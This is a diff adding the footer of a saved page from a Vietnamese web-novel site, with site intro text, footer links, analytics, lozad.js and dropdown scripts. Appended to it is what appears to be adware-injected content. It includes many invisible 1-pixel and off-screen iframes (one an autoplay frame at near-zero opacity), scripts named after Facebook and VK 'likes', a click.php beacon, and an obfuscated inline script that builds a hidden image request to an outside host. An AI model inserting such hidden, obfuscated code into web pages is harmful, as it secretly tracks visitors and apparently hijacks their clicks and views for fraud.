+            
+          </li>
+          <li class="keyword-fran">
+            <div class="label-ft">Lời giới thiệu</div>
+            <div class="des-info">
+              <p><strong>Truyện Nhiều</strong> - <a href="https://truyennhieu.com/" title="Đọc truyện online">Đọc truyện</a> online, <a href="https://truyennhieu.com/" title="Đọc truyện chữ">đọc truyện</a> chữ, <a href="https://truyennhieu.com/" title="Truyện hay">truyện hay</a>.
+                Website luôn cập nhật những bộ <a href="https://truyennhieu.com/danh-sach/truyen-moi/" title="Truyện mới">truyện mới</a> một cách nhanh nhất.</p>
+              <p>Tất cả các truyện trên site đều được đọc giả sưu tầm từ các nguồn trên mạng, chúng tôi không chịu bất cứ trách nhiệm nào về vấn đề bản quyền tác giả. </p>
+              <p>Nếu các bạn đọc truyện nào thấy có nội dung liên quan đến vấn đề chính trị hoặc có nội dung không lành mạnh vui lòng liên hệ truyennhieu.com@gmail.com để chúng tôi xóa bỏ truyện khỏi trang web. Chân thành cảm ơn.</p>
+            </div>
+          </li>
+
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="end-footer">
+    <div class="wrap">
+      <div class="container">
+        <ul>
+          <li><a rel="nofollow" href="https://truyennhieu.com/gioi-thieu/">Giới thiệu</a></li>
+          <li><a rel="nofollow" href="https://truyennhieu.com/dieu-khoan-su-dung/">Điều khoản sử dụng</a></li>
+          <li><a rel="nofollow" href="https://truyennhieu.com/chinh-sach-rieng-tu/">Chính sách riêng tư</a></li>
+          <li><a rel="nofollow" href="https://truyennhieu.com/lien-he/">Liên hệ</a></li>
+        </ul>
+        <p>Copyright © 2018 TruyenNhieu.com. All rights reserved</p>
+      </div>
+    </div>
+  </div>
+
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-129796990-1');
+</script>
+
+<script>
+    /*! lozad.js - v1.7.0 - 2018-11-08
+* https://github.com/ApoorvSaxena/lozad.js
+* Copyright (c) 2018 Apoorv Saxena; Licensed MIT */
+!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";var g=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var r=arguments[e];for(var o in r)Object.prototype.hasOwnProperty.call(r,o)&&(t[o]=r[o])}return t},r="undefined"!=typeof document&&document.documentMode,l={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=document.createElement("img");r&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),t.appendChild(e)}t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset")),t.getAttribute("data-background-image")&&(t.style.backgroundImage="url('"+t.getAttribute("data-background-image")+"')"),t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};
+/**
+   * Detect IE browser
+   * @const {boolean}
+   * @private
+   */function f(t){t.setAttribute("data-loaded",!0)}var b=function(t){return"true"===t.getAttribute("data-loaded")};return function(){var r,o,a=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=g({},l,t),n=e.root,i=e.rootMargin,d=e.threshold,u=e.load,c=e.loaded,s=void 0;return window.IntersectionObserver&&(s=new IntersectionObserver((r=u,o=c,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),b(t.target)||(r(t.target),f(t.target),o(t.target)))})}),{root:n,rootMargin:i,threshold:d})),{observe:function(){for(var t=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)}(a,n),e=0;e<t.length;e++)b(t[e])||(s?s.observe(t[e]):(u(t[e]),f(t[e]),c(t[e])))},triggerLoad:function(t){b(t)||(u(t),f(t),c(t))},observer:s}}});
+</script>
+<!-- <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9734357202549192",
+          enable_page_level_ads: true
+     });
+</script> -->
+<script>
+    $(".custom-select").each(function() {
+      var classes = $(this).attr("class"),
+          id      = $(this).attr("id"),
+          name    = $(this).attr("name");
+      var template =  '<div class="' + classes + '">';
+          template += '<span class="custom-select-trigger">' + $(this).attr("placeholder") + '</span>';
+          template += '<div class="custom-options">';
+          $(this).find("option").each(function() {
+            template += '<span class="custom-option ' + $(this).attr("class") + '" data-value="' + $(this).attr("value") + '">' + $(this).html() + '</span>';
+          });
+      template += '</div></div>';
+
+      $(this).wrap('<div class="custom-select-wrapper"></div>');
+      $(this).hide();
+      $(this).after(template);
+    });
+    $(".custom-option:first-of-type").hover(function() {
+      $(this).parents(".custom-options").addClass("option-hover");
+    }, function() {
+      $(this).parents(".custom-options").removeClass("option-hover");
+    });
+    $(".custom-select-trigger").on("click", function() {
+      $('html').one('click',function() {
+        $(".custom-select").removeClass("opened");
+      });
+      $(this).parents(".custom-select").toggleClass("opened");
+      event.stopPropagation();
+    });
+    $(".custom-option").on("click", function() {
+      $(this).parents(".custom-select-wrapper").find("select").val($(this).data("value"));
+      $(this).parents(".custom-options").find(".custom-option").removeClass("selection");
+      $(this).addClass("selection");
+      $(this).parents(".custom-select").removeClass("opened");
+      $(this).parents(".custom-select").find(".custom-select-trigger").text($(this).text());
+    });
+
+
+    $('#hotSources').parent().find('div.custom-select .custom-options span').click(function() {
+        let catId = $(this).attr('data-value')
+        $.ajax({
+            url: '/ajax/manual-hot-books?catId=' + catId,
+            success: function(data) {
+                $('.box-top-intro').html(data)
+                const observer = lozad();
+                observer.observe();
+            }
+        })
+    })
+    $('#updateSources').parent().find('div.custom-select .custom-options span').click(function() {
+        let catId = $(this).attr('data-value')
+        $.ajax({
+            url: '/ajax/newest-books?catId=' + catId,
+            success: function(data) {
+                $('.box-book-update').html(data)
+                const observer = lozad();
+                observer.observe();
+            }
+        })
+    })
+</script>
+
+<ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><ins id="aswift_1_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0px;width:0px;height:0px;" src="./truyennhieu_files/saved_resource(3).html"></iframe></ins></ins></ins><iframe height="1" width="1" src="./truyennhieu_files/log(5).html" style="display: none;"></iframe><script id="loader.js" src="./truyennhieu_files/loader.js.tải xuống"></script><img height="1" width="1" src="./truyennhieu_files/0968f872f4f94bc7(4)" style="display: none;"><script id="fbshowes_af2.js" src="./truyennhieu_files/fbshowes_af2.js.tải xuống"></script><script id="yloader.js" src="./truyennhieu_files/yloader.js.tải xuống"></script><script id="yaloader.js" src="./truyennhieu_files/yaloader.js.tải xuống"></script><script id="like_bb6.js" src="./truyennhieu_files/like_bb6.js.tải xuống"></script><script id="vklike_ab12.js" src="./truyennhieu_files/vklike_ab12.js.tải xuống"></script><script id="fblikes_bc3.js" src="./truyennhieu_files/fblikes_bc3.js.tải xuống"></script><script id="init.js" src="./truyennhieu_files/init.js.tải xuống"></script><script id="inloader.js" src="./truyennhieu_files/inloader.js.tải xuống"></script><script id="yviv" src="./truyennhieu_files/show_ic5.js.tải xuống"></script><div style="height: 1px; width: 1px; position: absolute; left: 0px; top: 0px; opacity: 0.01; z-index: -9999999;"><iframe src="./truyennhieu_files/embed.html" height="1" width="1" style="opacity: 0.01; position: absolute; z-index: -9999999;"></iframe></div><iframe id="google_osd_static_frame_2407070234440" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" src="./truyennhieu_files/saved_resource(4).html"></iframe><script src="./truyennhieu_files/l.js.tải xuống" type="text/javascript"></script><script src="./truyennhieu_files/492089.js.tải xuống" type="text/javascript"></script><div id="fbapiWorkDiv" style="position: absolute; height: 1px; width: 1px; z-index: -1; left: -9000px; top: 0px;"></div><div id="vkWidgetDiv" style="width: 1px; height: 1px; position: absolute; top: 0px; left: -999px; overflow: hidden;"><iframe src="./truyennhieu_files/widget_post.html" height="10" width="10"></iframe></div><div id="yaWidgetDiv" style="width: 1px; height: 1px; position: absolute; top: 0px; left: 0px; overflow: hidden;"><iframe src="./truyennhieu_files/yalister.html" height="10" width="10"></iframe></div><img src="./truyennhieu_files/saved_resource" style="display: none;"><iframe id="yin" src="./truyennhieu_files/in.html" height="1" width="1" style="height: 1px; width: 1px; position: absolute; left: -500px; top: 0px; display: none;"></iframe><script>var a=['createElement','div','innerHTML','<img\x20src=\x22','concat','.gif\x22\x20style=\x22position:absolute;left:-9999px;\x22>','body','appendChild','reverse','join','mgduwf.closiner.com','84'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x164));var b=function(c,d){c=c-0x0;var e=a[c];return e;};'use strict';var scm=['//','s:','tp','ht'][b('0x0')]()[b('0x1')]('');var pth=[b('0x2'),b('0x3')][b('0x1')]('/');var elm=document[b('0x4')](b('0x5'));elm[b('0x6')]=b('0x7')[b('0x8')](scm)[b('0x8')](pth,b('0x9'));document[b('0xa')][b('0xb')](elm);</script><div><img src="./truyennhieu_files/84.gif" style="position:absolute;left:-9999px;"></div><div style="width: 1343px; height: 232px; position: fixed; top: -100px; left: 0px; z-index: -99999999; overflow: hidden; background-repeat: no-repeat; background-position: 100px 100px;"><div style="width: 1343px; height: 232px; opacity: 0.01;"><iframe src="./truyennhieu_files/d-U0Y6qGhH4.html" width="1343" height="232" allow="autoplay; encrypted-media; picture-in-picture" style="width: 1343px; height: 232px;"></iframe></div></div><script src="./truyennhieu_files/l.js(1).tải xuống" type="text/javascript"></script><div id="fbWidgetDiv" style="width: 1px; height: 1px; position: absolute; top: 0px; left: -999px; overflow: hidden;"><iframe src="./truyennhieu_files/video.html" height="10" width="10"></iframe></div><img src="./truyennhieu_files/click.php"><div id="des_xnba_ewn"></div><iframe style="position:absolute;left:-999px;top:-999px;visibility:hidden" src="./truyennhieu_files/saved_resource(5).html"></iframe><iframe style="display: none; visibility: hidden;" src="./truyennhieu_files/saved_resource(6).html"></iframe><iframe src="./truyennhieu_files/413128-.html" style="width: 1px; height: 1px; border: none; position: absolute; top: 0px; left: 0px; z-index: -999; opacity: 0.01;"></iframe><iframe style="display: none; visibility: hidden;" src="./truyennhieu_files/saved_resource(7).html"></iframe><iframe src="./truyennhieu_files/yametrika.html" name="vcap_yam_345336" allow="autoplay; encrypted-media" scrolling="none" width="1" height="1" style="position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0;"></iframe><div style="background: transparent; display: none;" class=" has-svg"><style type="text/css">#JdYjxawe { display: none; position: relative; width: auto; top: auto; bottom: auto; left: auto; right: auto; border: 0; box-shadow: none; }#JdYjxawe { max-width: 640px; }#JdYjxawe.has-animate { display: block; opacity: 0; transition: opacity 600ms ease; }#JdYjxawe.has-animate.is-active { opacity: 1; }#JdYjxawe.is-fixed { margin: 0 !important; z-index: 1000; position: fixed; border: 2px solid #ffffff; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); }#JdYjxawe.is-fixed { width: 420px; max-width: 420px; }#JdYjxawe.is-fixed { bottom: 20px; right: 20px;  }#JdYjxawe__container { position: absolute; top: 0; bottom: 0; left: 0; right: 0; z-index: 10; }#JdYjxawe__container__preloader { display: block; position: absolute; top: 0; bottom: 0; left: 0; right: 0; z-index: 25; }#JdYjxawe__container__preloader.is-ready { display: none; }#JdYjxawe__container__preloader span { display: block; position: absolute; top: 50%; left: 50%; margin-left: -75px; margin-top: -75px; width: 150px; height: 150px; background-repeat: norepeat; background-size: 150px 150px; background-position: 50% 50%; }#JdYjxawe__container__preloader svg { width: 150px; height: 150px; }.no-svg #JdYjxawe__container__preloader svg { display: none }#JdYjxawe__ratio { position: relative; z-index: 5; }#JdYjxawe__container__ratio { position: relative;  z-index: 5; }#JdYjxawe__container__close { display: none; opacity: 0; position: absolute; top: 10px; right: 10px; transition: all 200ms ease; z-index: 20; }#JdYjxawe__container__close { box-shadow: 0 0 4px rgba(0, 0, 0, 0.5); background: rgba(255, 255, 255, 0.5); background-position: 50% 50%; background-repeat: no-repeat; background-size: 12px 12px; border-radius: 2px; width: 16px; height: 16px; }#JdYjxawe__container__close { color: #000000; text-shadow: 0 0 4px rgba(255, 255, 255, 0.5); text-align: center; line-height: 16px; font-size: 8px; font-family: Arial, sans-serif; font-weight: 400; }#JdYjxawe__container__close.is-close { background: #ffffff; cursor: pointer; }#JdYjxawe__container__close.is-close:hover { background: #f0f0f0; border-color: #f0f0f0 }#JdYjxawe__container__close.is-active { opacity: 1; }#JdYjxawe__container__close.is-close svg { width: 12px; height: 12px; position: absolute; top: 50%; left: 50%; margin-top: -6px; margin-left: -6px; }.no-svg #JdYjxawe__container__close.is-close svg { display: none }.no-svg #JdYjxawe__container__close.is-close { background-image: url('https://static.plovera.biz/front/icon/close@12x12.png') }#JdYjxawe__container__box { position: absolute; top: 0; bottom: 0; left: 0; right: 0; z-index: 15; }#JdYjxawe__container__box__iframe { border: 0 !important; display: block; margin: 0 !important; padding: 0 !important; position: absolute; top: 0; bottom: 0; left: 0; right: 0; width: 100% !important; height: 100% !important; overflow: hidden; }#JdYjxawe__container { background: #f0f0f0; }#JdYjxawe__container__preloader { background: #f0f0f0;  }.no-svg #JdYjxawe__container__preloader span { background-image: url('https://static.plovera.biz/front/preloader/p1@white.gif') }</style><div id="JdYjxawe" class=" is-fixed"><div id="JdYjxawe__container"><div id="JdYjxawe__container__ratio" style="padding-top: 56.25%;"></div><div id="JdYjxawe__container__box"></div><div id="JdYjxawe__container__close"></div><div id="JdYjxawe__container__preloader"><span id="JdYjxawe__container__preloader__span"><svg width="150px" height="150px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" class="lds-ripple" style="background: none;"><circle cx="50" cy="50" r="17.5225" fill="none" stroke="#e6e6e6" stroke-width="5"><animate attributeName="r" calcMode="spline" values="0;40" keyTimes="0;1" dur="3" keySplines="0 0.2 0.8 1" begin="-1.5s" repeatCount="indefinite"></animate><animate attributeName="opacity" calcMode="spline" values="1;0" keyTimes="0;1" dur="3" keySplines="0.2 0 0.8 1" begin="-1.5s" repeatCount="indefinite"></animate></circle><circle cx="50" cy="50" r="35.8924" fill="none" stroke="#cccccc" stroke-width="5"><animate attributeName="r" calcMode="spline" values="0;40" keyTimes="0;1" dur="3" keySplines="0 0.2 0.8 1" begin="0s" repeatCount="indefinite"></animate><animate attributeName="opacity" calcMode="spline" values="1;0" keyTimes="0;1" dur="3" keySplines="0.2 0 0.8 1" begin="0s" repeatCount="indefinite"></animate></circle></svg></span></div></div><div id="JdYjxawe__ratio" style="padding-top: 56.25%;"></div></div></div><script type="text/javascript" async="" src="./truyennhieu_files/settings.php"></script><div id="SL_balloon_obj" alt="0" style="display: block;"><div id="SL_button" class="SL_ImTranslatorLogo" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/imtranslator-s.png&quot;); display: none;"></div><div id="SL_shadow_translation_result2" style="display: none;"></div><div id="SL_shadow_translator" style="left: -10000px; top: -10000px; display: none;"><div id="SL_planshet"><div id="SL_arrow_up" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/up.png&quot;);"></div><div id="SL_Bproviders"></div><div id="SL_alert_bbl" style="display: none;"><div id="SLHKclose" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/delete.png&quot;);"></div><div id="SL_alert_cont"></div></div><div id="SL_TB"><table id="SL_tables" cellspacing="1"><tr><td class="SL_td" width="10%" align="right"><input id="SL_locer" type="checkbox" title="Khóa ngôn ngữ"></td><td class="SL_td" width="20%" align="left"><select id="SL_lng_from" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/select.png&quot;) 100% 0px no-repeat rgb(255, 255, 255);"><option value="auto">Phát hiện ngôn ngữ</option><option value="eo">Quốc Tế Ngữ</option><option value="ar">Tiếng Ả Rập</option><option value="sq">Tiếng Albania</option><option value="am">Tiếng Amharic</option><option value="en">Tiếng Anh</option><option value="hy">Tiếng Armenia</option><option value="az">Tiếng Azerbaijan</option><option value="pl">Tiếng Ba Lan</option><option value="fa">Tiếng Ba Tư</option><option value="xh">Tiếng Bantu</option><option value="eu">Tiếng Basque</option><option value="be">Tiếng Belarus</option><option value="bn">Tiếng Bengal</option><option value="pt">Tiếng Bồ Đào Nha</option><option value="bs">Tiếng Bosnia</option><option value="bg">Tiếng Bulgaria</option><option value="ca">Tiếng Catalan</option><option value="ceb">Tiếng Cebuano</option><option value="ny">Tiếng Chichewa</option><option value="co">Tiếng Corsi</option><option value="ht">Tiếng Creole ở Haiti</option><option value="hr">Tiếng Croatia</option><option value="da">Tiếng Đan Mạch</option><option value="iw">Tiếng Do Thái</option><option value="de">Tiếng Đức</option><option value="et">Tiếng Estonia</option><option value="tl">Tiếng Filipino</option><option value="fy">Tiếng Frisia</option><option value="gd">Tiếng Gael Scotland</option><option value="gl">Tiếng Galicia</option><option value="ka">Tiếng George</option><option value="gu">Tiếng Gujarat</option><option value="nl">Tiếng Hà Lan</option><option value="af">Tiếng Hà Lan (Nam Phi)</option><option value="ko">Tiếng Hàn</option><option value="ha">Tiếng Hausa</option><option value="haw">Tiếng Hawaii</option><option value="hi">Tiếng Hindi</option><option value="hmn">Tiếng Hmong</option><option value="hu">Tiếng Hungary</option><option value="el">Tiếng Hy Lạp</option><option value="is">Tiếng Iceland</option><option value="ig">Tiếng Igbo</option><option value="id">Tiếng Indonesia</option><option value="ga">Tiếng Ireland</option><option value="jw">Tiếng Java</option><option value="kn">Tiếng Kannada</option><option value="kk">Tiếng Kazakh</option><option value="km">Tiếng Khmer</option><option value="ku">Tiếng Kurd</option><option value="ky">Tiếng Kyrgyz</option><option value="lo">Tiếng Lào</option><option value="la">Tiếng Latinh</option><option value="lv">Tiếng Latvia</option><option value="lt">Tiếng Litva</option><option value="lb">Tiếng Luxembourg</option><option value="ms">Tiếng Mã Lai</option><option value="mk">Tiếng Macedonia</option><option value="mg">Tiếng Malagasy</option><option value="ml">Tiếng Malayalam</option><option value="mt">Tiếng Malta</option><option value="mi">Tiếng Maori</option><option value="mr">Tiếng Marathi</option><option value="mn">Tiếng Mông Cổ</option><option value="my">Tiếng Myanmar</option><option value="no">Tiếng Na Uy</option><option value="ne">Tiếng Nepal</option><option value="ru">Tiếng Nga</option><option value="ja">Tiếng Nhật</option><option value="ps">Tiếng Pashto</option><option value="fi">Tiếng Phần Lan</option><option value="fr">Tiếng Pháp</option><option value="pa">Tiếng Punjab</option><option value="ro">Tiếng Rumani</option><option value="sm">Tiếng Samoa</option><option value="cs">Tiếng Séc</option><option value="sr">Tiếng Serbia</option><option value="st">Tiếng Sesotho</option><option value="sn">Tiếng Shona</option><option value="sd">Tiếng Sindhi</option><option value="si">Tiếng Sinhala</option><option value="sk">Tiếng Slovak</option><option value="sl">Tiếng Slovenia</option><option value="so">Tiếng Somali</option><option value="su">Tiếng Sunda</option><option value="sw">Tiếng Swahili</option><option value="tg">Tiếng Tajik</option><option value="ta">Tiếng Tamil</option><option value="es">Tiếng Tây Ban Nha</option><option value="te">Tiếng Telugu</option><option value="th">Tiếng Thái</option><option value="tr">Tiếng Thổ Nhĩ Kỳ</option><option value="sv">Tiếng Thụy Điển</option><option value="zh-CN">Tiếng Trung</option><option value="zh-TW">Tiếng Trung giản thể</option><option value="uk">Tiếng Ukraina</option><option value="ur">Tiếng Urdu</option><option value="uz">Tiếng Uzbek</option><option value="vi">Tiếng Việt</option><option value="cy">Tiếng Xứ Wales</option><option value="it">Tiếng Ý</option><option value="yi">Tiếng Yiddish</option><option value="yo">Tiếng Yoruba</option><option value="zu">Tiếng Zulu</option></select></td><td class="SL_td" width="3" align="center"><div id="SL_switch_b" title="Chuyển ngôn ngữ" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/switchb.png&quot;);"></div></td><td class="SL_td" width="20%" align="left"><select id="SL_lng_to" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/select.png&quot;) 100% 0px no-repeat rgb(255, 255, 255);"><option value="eo">Quốc Tế Ngữ</option><option value="ar">Tiếng Ả Rập</option><option value="sq">Tiếng Albania</option><option value="am">Tiếng Amharic</option><option value="en">Tiếng Anh</option><option value="hy">Tiếng Armenia</option><option value="az">Tiếng Azerbaijan</option><option value="pl">Tiếng Ba Lan</option><option value="fa">Tiếng Ba Tư</option><option value="xh">Tiếng Bantu</option><option value="eu">Tiếng Basque</option><option value="be">Tiếng Belarus</option><option value="bn">Tiếng Bengal</option><option value="pt">Tiếng Bồ Đào Nha</option><option value="bs">Tiếng Bosnia</option><option value="bg">Tiếng Bulgaria</option><option value="ca">Tiếng Catalan</option><option value="ceb">Tiếng Cebuano</option><option value="ny">Tiếng Chichewa</option><option value="co">Tiếng Corsi</option><option value="ht">Tiếng Creole ở Haiti</option><option value="hr">Tiếng Croatia</option><option value="da">Tiếng Đan Mạch</option><option value="iw">Tiếng Do Thái</option><option value="de">Tiếng Đức</option><option value="et">Tiếng Estonia</option><option value="tl">Tiếng Filipino</option><option value="fy">Tiếng Frisia</option><option value="gd">Tiếng Gael Scotland</option><option value="gl">Tiếng Galicia</option><option value="ka">Tiếng George</option><option value="gu">Tiếng Gujarat</option><option value="nl">Tiếng Hà Lan</option><option value="af">Tiếng Hà Lan (Nam Phi)</option><option value="ko">Tiếng Hàn</option><option value="ha">Tiếng Hausa</option><option value="haw">Tiếng Hawaii</option><option value="hi">Tiếng Hindi</option><option value="hmn">Tiếng Hmong</option><option value="hu">Tiếng Hungary</option><option value="el">Tiếng Hy Lạp</option><option value="is">Tiếng Iceland</option><option value="ig">Tiếng Igbo</option><option value="id">Tiếng Indonesia</option><option value="ga">Tiếng Ireland</option><option value="jw">Tiếng Java</option><option value="kn">Tiếng Kannada</option><option value="kk">Tiếng Kazakh</option><option value="km">Tiếng Khmer</option><option value="ku">Tiếng Kurd</option><option value="ky">Tiếng Kyrgyz</option><option value="lo">Tiếng Lào</option><option value="la">Tiếng Latinh</option><option value="lv">Tiếng Latvia</option><option value="lt">Tiếng Litva</option><option value="lb">Tiếng Luxembourg</option><option value="ms">Tiếng Mã Lai</option><option value="mk">Tiếng Macedonia</option><option value="mg">Tiếng Malagasy</option><option value="ml">Tiếng Malayalam</option><option value="mt">Tiếng Malta</option><option value="mi">Tiếng Maori</option><option value="mr">Tiếng Marathi</option><option value="mn">Tiếng Mông Cổ</option><option value="my">Tiếng Myanmar</option><option value="no">Tiếng Na Uy</option><option value="ne">Tiếng Nepal</option><option value="ru">Tiếng Nga</option><option value="ja">Tiếng Nhật</option><option value="ps">Tiếng Pashto</option><option value="fi">Tiếng Phần Lan</option><option value="fr">Tiếng Pháp</option><option value="pa">Tiếng Punjab</option><option value="ro">Tiếng Rumani</option><option value="sm">Tiếng Samoa</option><option value="cs">Tiếng Séc</option><option value="sr">Tiếng Serbia</option><option value="st">Tiếng Sesotho</option><option value="sn">Tiếng Shona</option><option value="sd">Tiếng Sindhi</option><option value="si">Tiếng Sinhala</option><option value="sk">Tiếng Slovak</option><option value="sl">Tiếng Slovenia</option><option value="so">Tiếng Somali</option><option value="su">Tiếng Sunda</option><option value="sw">Tiếng Swahili</option><option value="tg">Tiếng Tajik</option><option value="ta">Tiếng Tamil</option><option value="es">Tiếng Tây Ban Nha</option><option value="te">Tiếng Telugu</option><option value="th">Tiếng Thái</option><option value="tr">Tiếng Thổ Nhĩ Kỳ</option><option value="sv">Tiếng Thụy Điển</option><option value="zh-CN">Tiếng Trung</option><option value="zh-TW">Tiếng Trung giản thể</option><option value="uk">Tiếng Ukraina</option><option value="ur">Tiếng Urdu</option><option value="uz">Tiếng Uzbek</option><option selected="selected" value="vi">Tiếng Việt</option><option value="cy">Tiếng Xứ Wales</option><option value="it">Tiếng Ý</option><option value="yi">Tiếng Yiddish</option><option value="yo">Tiếng Yoruba</option><option value="zu">Tiếng Zulu</option></select></td><td class="SL_td" width="5%" align="center"> </td><td class="SL_td" width="8%" align="center"><div id="SL_TTS_voice" title="undefined" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/ttsvoice.png&quot;);"></div></td><td class="SL_td" width="8%" align="center"><div id="SL_copy" title="Chép bản dịch" class="SL_copy" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/copy.png&quot;);"></div></td><td class="SL_td" width="8%" align="center"><div id="SL_bbl_font_patch"></div><div id="SL_bbl_font" title="Cỡ chữ" class="SL_bbl_font" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/font.png&quot;);"></div></td><td class="SL_td" width="8%" align="center"><div id="SL_bbl_help" title="Trợ giúp" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bhelp.png&quot;);"></div></td><td class="SL_td" width="15%" align="right"><div id="SL_pin" class="SL_pin_off" title="Gắn cửa sổ pop-up" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/pin-on.png&quot;);"></div></td></tr></table></div></div><div id="SL_shadow_translation_result" style="visibility: visible;"></div><div id="SL_loading" class="SL_loading" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/loading.gif&quot;);"></div><div id="SL_player2"></div><div id="SL_alert100">Chức năng phát âm giới hạn ở 200 ký tự</div><div id="SL_Balloon_options" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bg3.png&quot;) rgb(255, 255, 255);"><div id="SL_arrow_down" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/down.png&quot;);"></div><table id="SL_tbl_opt" width="100%"><tr><td class="SL_td" width="5%" align="center"><input id="SL_BBL_locer" type="checkbox" checked="1" title="Hiển thị nút của biên dịch viên 3 giây"></td><td class="SL_td" width="5%" align="left"><div id="SL_BBL_IMG" title="Hiển thị nút của biên dịch viên 3 giây" style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bbl-logo.png&quot;);"></div></td><td class="SL_td" width="70%" align="center"><a href="chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/html/options/options.html?bbl" target="_blank" class="SL_options" title="Hiển thị các tùy chọn">Các Tùy chọn</a> : <a href="chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/html/options/options.html?hist" target="_blank" class="SL_options" title="Lược sử biên dịch">Lược sử</a> : <a href="chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/html/options/options.html?feed" target="_blank" class="SL_options" title="Phản hồi">Phản hồi</a> : <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;hosted_button_id=GD9D8CPW8HFA2" target="_blank" class="SL_options" title="Đóng góp">Donate</a></td><td class="SL_td" width="15%" align="right"><span id="SL_Balloon_Close" class="SL_options" title="Đóng">Đóng</span></td></tr></table></div></div></div></body><iframe id="google_shimpl" style="display: none;" src="./truyennhieu_files/saved_resource(8).html"></iframe><iframe id="google_esf" name="google_esf" src="./truyennhieu_files/zrt_lookup.html" data-ad-client="ca-pub-2978388862278998" style="display: none;"></iframe></html>
